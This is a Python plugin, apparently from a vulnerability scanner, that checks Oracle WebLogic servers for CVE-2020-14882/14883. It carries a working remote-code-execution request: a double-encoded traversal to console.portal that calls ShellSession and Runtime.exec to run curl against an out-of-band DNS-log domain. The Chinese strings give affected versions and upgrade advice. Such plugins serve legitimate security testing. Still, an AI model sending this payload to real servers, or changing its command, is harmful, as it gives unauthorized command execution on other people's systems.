#!/usr/bin/env python
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    try:
        details = u"""\
目标存在WebLogic CVE-2020-14882 & CVE-2020-14883 漏洞，
未授权执行任意命令，获取系统权限
影响版本: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. 及以下
需要升级到对应版本以上，推荐最新版本\n"""
        domain = dns_monitor(ip, port).add_checker(
            'weblogic-cve-2020-14882', alert_group='WebLogic RCE CVE-2020-14883', details=details)

        base_url = "{}://{}:{}".format(service, ip, port)
        path = "/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=" \
               "com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime()." \
               "exec(%27curl%20{}%27);%22);".format('http://' + domain)

        r = await http_client(ip, port).get(base_url + path, timeout=20)

        if "No handle class found for type: com.tangosol.coherence.mvel2.sh.ShellSession" in r.text:
            ret = {
                'alert_group': 'WebLogic Auth Bypass CVE-2020-14882',
                'affects': base_url,
                'details': u"URL： {} \n存在WebLogic CVE-2020-14882 漏洞，通过该漏洞可以在未授权的情报下，"
                           u"执行任意命令，获取系统权限\n".format(base_url + path) +
                           u"影响版本 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. 及以下\n"
                           u"需要升级到对应版本以上，推荐最新版本"
            }
            return ret

    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 7001, 'http', True, task_msg={})
    run_plugin_test(scan)
